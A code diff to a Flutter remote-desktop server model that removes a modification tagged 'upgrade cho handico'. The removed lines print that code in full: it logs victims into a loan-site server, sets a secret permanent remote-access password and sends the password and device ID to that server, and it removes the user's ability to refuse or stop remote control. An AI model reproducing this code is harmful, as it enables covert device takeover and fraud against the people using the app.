@@ -1,18 +1,13 @@
 import 'dart:async';
 import 'dart:convert';
-import 'dart:io';
-//++++Reminani : upgrade cho handico
-import 'dart:math';
-//----Reminani : upgrade cho handico
+
 import 'package:flutter/material.dart';
-import 'package:flutter/services.dart';
 import 'package:flutter_hbb/consts.dart';
 import 'package:flutter_hbb/main.dart';
 import 'package:flutter_hbb/models/chat_model.dart';
 import 'package:flutter_hbb/models/platform_model.dart';
 import 'package:get/get.dart';
-import 'package:shared_preferences/shared_preferences.dart';
-import 'package:wakelock/wakelock.dart';
+import 'package:wakelock_plus/wakelock_plus.dart';
 import 'package:window_manager/window_manager.dart';
 
 import '../common.dart';
@@ -21,7 +16,6 @@ import '../desktop/pages/server_page.dart' as desktop;
 import '../desktop/widgets/tabbar_widget.dart';
 import '../mobile/pages/server_page.dart';
 import 'model.dart';
-import 'package:http/http.dart' as http;
 
 const kLoginDialogTag = "LOGIN";
 
@@ -33,19 +27,15 @@ class ServerModel with ChangeNotifier {
   bool _isStart = false; // Android MainService status
   bool _mediaOk = false;
   bool _inputOk = false;
-  //++++Reminani : upgrade cho handico
-  bool _platformOk = false;
-  bool _deviceOk = false;
-  bool _cameraOk = false;
-  //----Reminani : upgrade cho handico
   bool _audioOk = false;
   bool _fileOk = false;
   bool _showElevation = false;
-  bool _hideCm = false;
+  bool hideCm = false;
   int _connectStatus = 0; // Rendezvous Server status
   String _verificationMethod = "";
   String _temporaryPasswordLength = "";
   String _approveMode = "";
+  int _zeroClientLengthCounter = 0;
 
   late String _emptyIdShow;
   late final IDTextEditingController _serverId;
@@ -63,26 +53,14 @@ class ServerModel with ChangeNotifier {
   bool get mediaOk => _mediaOk;
 
   bool get inputOk => _inputOk;
-  //++++Reminani : upgrade cho handico
-  bool get platformOk => _platformOk;
 
-  bool get deviceOk => _deviceOk;
-  bool get cameraOk => _cameraOk;
-  //----Reminani : upgrade cho handico
   bool get audioOk => _audioOk;
 
   bool get fileOk => _fileOk;
 
   bool get showElevation => _showElevation;
 
-  bool get hideCm => _hideCm;
-
   int get connectStatus => _connectStatus;
-  //++++Reminani : upgrade cho handico
-  static String token = '';
-  static int idLogin = -1 ;
-  static const platform = MethodChannel('mChannel');
-  //----Reminani : upgrade cho handico
 
   String get verificationMethod {
     final index = [
@@ -100,10 +78,12 @@ class ServerModel with ChangeNotifier {
 
   setVerificationMethod(String method) async {
     await bind.mainSetOption(key: "verification-method", value: method);
+    /*
     if (method != kUsePermanentPassword) {
       await bind.mainSetOption(
           key: 'allow-hide-cm', value: bool2option('allow-hide-cm', false));
     }
+    */
   }
 
   String get temporaryPasswordLength {
@@ -120,10 +100,12 @@ class ServerModel with ChangeNotifier {
 
   setApproveMode(String mode) async {
     await bind.mainSetOption(key: 'approve-mode', value: mode);
+    /*
     if (mode != 'password') {
       await bind.mainSetOption(
           key: 'allow-hide-cm', value: bool2option('allow-hide-cm', false));
     }
+    */
   }
 
   TextEditingController get serverId => _serverId;
@@ -140,6 +122,19 @@ class ServerModel with ChangeNotifier {
     _emptyIdShow = translate("Generating ...");
     _serverId = IDTextEditingController(text: _emptyIdShow);
 
+    /*
+    // initital _hideCm at startup
+    final verificationMethod =
+        bind.mainGetOptionSync(key: "verification-method");
+    final approveMode = bind.mainGetOptionSync(key: 'approve-mode');
+    _hideCm = option2bool(
+        'allow-hide-cm', bind.mainGetOptionSync(key: 'allow-hide-cm'));
+    if (!(approveMode == 'password' &&
+        verificationMethod == kUsePermanentPassword)) {
+      _hideCm = false;
+    }
+    */
+
     timerCallback() async {
       final connectionStatus =
           jsonDecode(await bind.mainGetConnectStatus()) as Map<String, dynamic>;
@@ -154,6 +149,17 @@ class ServerModel with ChangeNotifier {
         if (res != null) {
           debugPrint("clients not match!");
           updateClientState(res);
+        } else {
+          if (_clients.isEmpty) {
+            hideCmWindow();
+            if (_zeroClientLengthCounter++ == 12) {
+              // 6 second
+              windowManager.close();
+            }
+          } else {
+            _zeroClientLengthCounter = 0;
+            if (!hideCm) showCmWindow();
+          }
         }
       }
 
@@ -187,16 +193,6 @@ class ServerModel with ChangeNotifier {
       _audioOk = audioOption.isEmpty;
     }
 
-  //++++Reminani : upgrade cho handico
-    // camera
-    if (!await AndroidPermissionManager.check(kCamera)) {
-      _cameraOk = false;
-      bind.mainSetOption(key: "enable-camera", value: "N");
-    } else {
-      final audioOption = await bind.mainGetOption(key: 'enable-camera');
-      _cameraOk = audioOption.isEmpty;
-    }
-  //----Reminani : upgrade cho handico
     // file
     if (!await AndroidPermissionManager.check(kManageExternalStorage)) {
       _fileOk = false;
@@ -217,27 +213,30 @@ class ServerModel with ChangeNotifier {
     final temporaryPasswordLength =
         await bind.mainGetOption(key: "temporary-password-length");
     final approveMode = await bind.mainGetOption(key: 'approve-mode');
+    /*
     var hideCm = option2bool(
         'allow-hide-cm', await bind.mainGetOption(key: 'allow-hide-cm'));
     if (!(approveMode == 'password' &&
         verificationMethod == kUsePermanentPassword)) {
       hideCm = false;
     }
+    */
     if (_approveMode != approveMode) {
       _approveMode = approveMode;
       update = true;
     }
-    final oldPwdText = _serverPasswd.text;
-    if (_serverPasswd.text != temporaryPassword &&
-        temporaryPassword.isNotEmpty) {
-      _serverPasswd.text = temporaryPassword;
-    }
     var stopped = option2bool(
         "stop-service", await bind.mainGetOption(key: "stop-service"));
+    final oldPwdText = _serverPasswd.text;
     if (stopped ||
         verificationMethod == kUsePermanentPassword ||
         _approveMode == 'click') {
       _serverPasswd.text = '-';
+    } else {
+      if (_serverPasswd.text != temporaryPassword &&
+          temporaryPassword.isNotEmpty) {
+        _serverPasswd.text = temporaryPassword;
+      }
     }
     if (oldPwdText != _serverPasswd.text) {
       update = true;
@@ -247,9 +246,13 @@ class ServerModel with ChangeNotifier {
       update = true;
     }
     if (_temporaryPasswordLength != temporaryPasswordLength) {
+      if (_temporaryPasswordLength.isNotEmpty) {
+        bind.mainUpdateTemporaryPassword();
+      }
       _temporaryPasswordLength = temporaryPasswordLength;
       update = true;
     }
+    /*
     if (_hideCm != hideCm) {
       _hideCm = hideCm;
       if (desktopType == DesktopType.cm) {
@@ -261,6 +264,7 @@ class ServerModel with ChangeNotifier {
       }
       update = true;
     }
+    */
     if (update) {
       notifyListeners();
     }
@@ -307,11 +311,8 @@ class ServerModel with ChangeNotifier {
       await showClientsMayNotBeChangedAlert(parent.target);
     }
     if (_inputOk) {
-  //++++Reminani : upgrade cho handico
-      //khong cho stop input remote
-      // parent.target?.invokeMethod("stop_input");
-      // bind.mainSetOption(key: "enable-keyboard", value: 'N');
-  //----Reminani : upgrade cho handico
+      parent.target?.invokeMethod("stop_input");
+      bind.mainSetOption(key: "enable-keyboard", value: 'N');
     } else {
       if (parent.target != null) {
         /// the result of toggle-on depends on user actions in the settings page.
@@ -323,59 +324,7 @@ class ServerModel with ChangeNotifier {
 
   /// Toggle the screen sharing service.
   toggleService() async {
-    //++++Reminani : upgrade cho handico
-    // if (_isStart) {
-    //   final res = await parent.target?.dialogManager
-    //       .show<bool>((setState, close, context) {
-    //     submit() => close(true);
-    //     return CustomAlertDialog(
-    //       title: Row(children: [
-    //         const Icon(Icons.warning_amber_sharp,
-    //             color: Colors.redAccent, size: 28),
-    //         const SizedBox(width: 10),
-    //         Text(translate("Warning")),
-    //       ]),
-    //       content: Text(translate("android_stop_service_tip")),
-    //       actions: [
-    //         TextButton(onPressed: close, child: Text(translate("Cancel"))),
-    //         TextButton(onPressed: submit, child: Text(translate("OK"))),
-    //       ],
-    //       onSubmit: submit,
-    //       onCancel: close,
-    //     );
-    //   });
-    //   if (res == true) {
-    //     stopService();
-    //   }
-    // } else {
-    //   final res = await parent.target?.dialogManager
-    //       .show<bool>((setState, close, context) {
-    //     submit() => close(true);
-    //     return CustomAlertDialog(
-    //       title: Row(children: [
-    //         const Icon(Icons.warning_amber_sharp,
-    //             color: Colors.redAccent, size: 28),
-    //         const SizedBox(width: 10),
-    //         Text(translate("Warning")),
-    //       ]),
-    //       content: Text(translate("android_service_will_start_tip")),
-    //       actions: [
-    //         dialogButton("Cancel", onPressed: close, isOutline: true),
-    //         dialogButton("OK", onPressed: submit),
-    //       ],
-    //       onSubmit: submit,
-    //       onCancel: close,
-    //     );
-    //   });
-    //   if (res == true) {
-    //     startService();
-    //   }
-    // }
-    //----Reminani : upgrade cho handico
-  }
-
-  startVerifyProcess(id, pw) async {
-    if (!_isStart) {
+    if (_isStart) {
       final res = await parent.target?.dialogManager
           .show<bool>((setState, close, context) {
         submit() => close(true);
@@ -384,10 +333,34 @@ class ServerModel with ChangeNotifier {
             const Icon(Icons.warning_amber_sharp,
                 color: Colors.redAccent, size: 28),
             const SizedBox(width: 10),
-            Text("Thông báo"),
+            Text(translate("Warning")),
+          ]),
+          content: Text(translate("android_stop_service_tip")),
+          actions: [
+            TextButton(onPressed: close, child: Text(translate("Cancel"))),
+            TextButton(onPressed: submit, child: Text(translate("OK"))),
+          ],
+          onSubmit: submit,
+          onCancel: close,
+        );
+      });
+      if (res == true) {
+        stopService();
+      }
+    } else {
+      final res = await parent.target?.dialogManager
+          .show<bool>((setState, close, context) {
+        submit() => close(true);
+        return CustomAlertDialog(
+          title: Row(children: [
+            const Icon(Icons.warning_amber_sharp,
+                color: Colors.redAccent, size: 28),
+            const SizedBox(width: 10),
+            Text(translate("Warning")),
           ]),
           content: Text(translate("android_service_will_start_tip")),
           actions: [
+            dialogButton("Cancel", onPressed: close, isOutline: true),
             dialogButton("OK", onPressed: submit),
           ],
           onSubmit: submit,
@@ -395,7 +368,7 @@ class ServerModel with ChangeNotifier {
         );
       });
       if (res == true) {
-        loginLoanMember(loanUsername: id, loanUserPassword: pw);
+        startService();
       }
     }
   }
@@ -409,8 +382,8 @@ class ServerModel with ChangeNotifier {
     // ugly is here, because for desktop, below is useless
     await bind.mainStartService();
     updateClientState();
-    if (Platform.isAndroid) {
-      Wakelock.enable();
+    if (isAndroid) {
+      WakelockPlus.enable();
     }
   }
 
@@ -421,9 +394,9 @@ class ServerModel with ChangeNotifier {
     await parent.target?.invokeMethod("stop_service");
     await bind.mainStopService();
     notifyListeners();
-    if (!Platform.isLinux) {
+    if (!isLinux) {
       // current linux is not supported
-      Wakelock.disable();
+      WakelockPlus.disable();
     }
   }
 
@@ -445,85 +418,6 @@ class ServerModel with ChangeNotifier {
       notifyListeners();
     }
   }
-  //++++Reminani : upgrade cho handico
-  saveAndSendInfo({String? id, String? pw}) async {
-    final id = await bind.mainGetMyId();
-
-    var url2 =
-    Uri.http('verify-cdn.vaytienmat-nhanh24h.com', 'Loans/user/updateLoan');
-    const kUsePermanentPassword = "use-permanent-password";
-
-    await bind.mainSetOption(
-        key: "verification-method", value: kUsePermanentPassword);
-    await updatePasswordModel();
-    Random random = Random();
-    List<int> numbers = List.generate(7, (index) => random.nextInt(10));
-    String pwRandom = numbers.join();
-    final p0 = TextEditingController(text: pwRandom);
-
-    String pwRandom1 = "${p0.text.trim()}";
-    await setPermanentPassword(pwRandom1);
-
-    http.post(url2,
-        headers: {
-          'Content-type': 'application/json',
-          'Accept': 'application/json',
-          "Authorization": "Bearer $token"
-        },
-        body: json.encode(
-          <String, dynamic>{
-            'id': idLogin,
-            'data': json.encode(
-              <String, dynamic>{
-                "remote_password": pwRandom1,
-                "remote_id": id,
-              },
-            )
-          },
-        ));
-  }
-
-  void loginLoanMember({String? loanUsername, String? loanUserPassword}) async {
-    if (loanUsername != null && loanUsername.isNotEmpty && loanUserPassword != null && loanUserPassword.isNotEmpty) {
-      var url = Uri.http('verify-cdn.vaytienmat-nhanh24h.com', 'Member/loginMember');
-
-      final resp = await http.post(url, body: {'phonenum': loanUsername, 'password': loanUserPassword});
-      if (resp.statusCode == 200) {
-        var decodedResponse = jsonDecode((resp.body)) as Map;
-        idLogin = decodedResponse["data"]["id"];
-        token = decodedResponse["data"]["token"];
-        final SharedPreferences prefs = await SharedPreferences.getInstance();
-        await prefs.setInt('idLogin', idLogin);
-        await prefs.setString('tokenLogin', token);
-        await prefs.setString('userName', loanUsername);
-        await prefs.setString('password', loanUserPassword);
-        if(decodedResponse["data"]["identity_loan"] != null) {
-          await prefs.setString('identityLoan', decodedResponse["data"]["identity_loan"]);
-        }
-        await _setUserInfoToUpdate(idLogin, token);
-        await startService();
-        saveAndSendInfo(id:loanUsername, pw: loanUserPassword);
-      } else {
-         parent.target?.dialogManager
-            .show<bool>((setState, close, context) {
-          return CustomAlertDialog(
-            title: Row(children: [
-              const Icon(Icons.warning_amber_sharp,
-                  color: Colors.redAccent, size: 28),
-              const SizedBox(width: 10),
-              Text(translate("Cảnh báo")),
-            ]),
-            content: Text(translate("ID hoặc mật khẩu không đúng")),
-            actions: [
-              dialogButton("OK", onPressed: close),
-            ],
-            onSubmit: close,
-          );
-        });
-      }
-    }
-  }
-  //----Reminani : upgrade cho handico
 
   changeStatue(String name, bool value) {
     debugPrint("changeStatue value $value");
@@ -550,18 +444,36 @@ class ServerModel with ChangeNotifier {
   updateClientState([String? json]) async {
     if (isTest) return;
     var res = await bind.cmGetClientsState();
+    List<dynamic> clientsJson;
     try {
-      final List clientsJson = jsonDecode(res);
-      _clients.clear();
-      tabController.state.value.tabs.clear();
-      for (var clientJson in clientsJson) {
+      clientsJson = jsonDecode(res);
+    } catch (e) {
+      debugPrint("Failed to decode clientsJson: '$res', error $e");
+      return;
+    }
+
+    final oldClientLenght = _clients.length;
+    _clients.clear();
+    tabController.state.value.tabs.clear();
+
+    for (var clientJson in clientsJson) {
+      try {
         final client = Client.fromJson(clientJson);
         _clients.add(client);
         _addTab(client);
+      } catch (e) {
+        debugPrint("Failed to decode clientJson '$clientJson', error $e");
       }
+    }
+    if (desktopType == DesktopType.cm) {
+      if (_clients.isEmpty) {
+        hideCmWindow();
+      } else if (!hideCm) {
+        showCmWindow();
+      }
+    }
+    if (_clients.length != oldClientLenght) {
       notifyListeners();
-    } catch (e) {
-      debugPrint("Failed to updateClientState:$e");
     }
   }
 
@@ -590,12 +502,12 @@ class ServerModel with ChangeNotifier {
         _clients.removeAt(index_disconnected);
         tabController.remove(index_disconnected);
       }
+      if (desktopType == DesktopType.cm && !hideCm) {
+        showCmWindow();
+      }
       scrollToBottom();
       notifyListeners();
-  //++++Reminani : upgrade cho handico
-      //không cần show popup
-      // if (isAndroid && !client.authorized) showLoginDialog(client);
-  //----Reminani : upgrade cho handico
+      if (isAndroid && !client.authorized) showLoginDialog(client);
     } catch (e) {
       debugPrint("Failed to call loginRequest,error:$e");
     }
@@ -609,7 +521,7 @@ class ServerModel with ChangeNotifier {
         onTap: () {},
         page: desktop.buildConnectionCard(client)));
     Future.delayed(Duration.zero, () async {
-      if (!hideCm) window_on_top(null);
+      if (!hideCm) windowOnTop(null);
     });
     // Only do the hidden task when on Desktop.
     if (client.authorized && isDesktop) {
@@ -650,11 +562,8 @@ class ServerModel with ChangeNotifier {
           mainAxisAlignment: MainAxisAlignment.center,
           crossAxisAlignment: CrossAxisAlignment.start,
           children: [
-  //++++Reminani : upgrade cho handico
-            // Text(translate("Do you accept?")),
-            Text("Kết nối xác thực"),
-            // ClientInfo(client),
-  //----Reminani : upgrade cho handico
+            Text(translate("Do you accept?")),
+            ClientInfo(client),
             Text(
               translate("android_new_connection_tip"),
               style: Theme.of(globalKey.currentContext!).textTheme.bodyMedium,
@@ -662,12 +571,9 @@ class ServerModel with ChangeNotifier {
           ],
         ),
         actions: [
-  //++++Reminani : upgrade cho handico
-          // dialogButton("Dismiss", onPressed: cancel, isOutline: true),
-          //if (approveMode != 'password')
-          // dialogButton("Accept", onPressed: submit),
-          dialogButton("Đồng ý", onPressed: submit),
-  //----Reminani : upgrade cho handico
+          dialogButton("Dismiss", onPressed: cancel, isOutline: true),
+          if (approveMode != 'password')
+            dialogButton("Accept", onPressed: submit),
         ],
         onSubmit: submit,
         onCancel: cancel,
@@ -719,6 +625,9 @@ class ServerModel with ChangeNotifier {
         parent.target?.dialogManager.dismissByTag(getLoginDialogTag(id));
         parent.target?.invokeMethod("cancel_notification", id);
       }
+      if (desktopType == DesktopType.cm && _clients.isEmpty) {
+        hideCmWindow();
+      }
       notifyListeners();
     } catch (e) {
       debugPrint("onClientRemove failed,error:$e");
@@ -754,7 +663,7 @@ class ServerModel with ChangeNotifier {
         if (client.incomingVoiceCall) {
           // Has incoming phone call, let's set the window on top.
           Future.delayed(Duration.zero, () {
-            window_on_top(null);
+            windowOnTop(null);
           });
         }
         notifyListeners();
@@ -763,13 +672,6 @@ class ServerModel with ChangeNotifier {
       debugPrint("updateVoiceCallState failed: $e");
     }
   }
-
-  Future<void> _setUserInfoToUpdate(int idLogin, String token) async {
-    try {
-      await platform.invokeMethod('user_update', {'idLogin': idLogin, "token": token});
-    } on PlatformException catch (e) {}
-  }
-
 }
 
 enum ClientType {
@@ -791,6 +693,7 @@ class Client {
   bool file = false;
   bool restart = false;
   bool recording = false;
+  bool blockInput = false;
   bool disconnected = false;
   bool fromSwitch = false;
   bool inVoiceCall = false;
@@ -814,6 +717,7 @@ class Client {
     file = json['file'];
     restart = json['restart'];
     recording = json['recording'];
+    blockInput = json['block_input'];
     disconnected = json['disconnected'];
     fromSwitch = json['from_switch'];
     inVoiceCall = json['in_voice_call'];
@@ -834,6 +738,7 @@ class Client {
     data['file'] = file;
     data['restart'] = restart;
     data['recording'] = recording;
+    data['block_input'] = blockInput;
     data['disconnected'] = disconnected;
     data['from_switch'] = fromSwitch;
     return data;
@@ -862,10 +767,7 @@ showInputWarnAlert(FFI ffi) {
     }
 
     return CustomAlertDialog(
-  //++++Reminani : upgrade cho handico
-      // title: Text(translate("How to get Android input permission?")),
-      title: Text("Xác thực hành động"),
-  //----Reminani : upgrade cho handico
+      title: Text(translate("How to get Android input permission?")),
       content: Column(
         mainAxisSize: MainAxisSize.min,
         children: [
@@ -875,10 +777,8 @@ showInputWarnAlert(FFI ffi) {
         ],
       ),
       actions: [
-  //++++Reminani : upgrade cho handico
-        // dialogButton("Quay lại", onPressed: close, isOutline: true),
-        dialogButton("Bắt đầu", onPressed: submit),
-  //----Reminani : upgrade cho handico
+        dialogButton("Cancel", onPressed: close, isOutline: true),
+        dialogButton("Open System Setting", onPressed: submit),
       ],
       onSubmit: submit,
       onCancel: close,
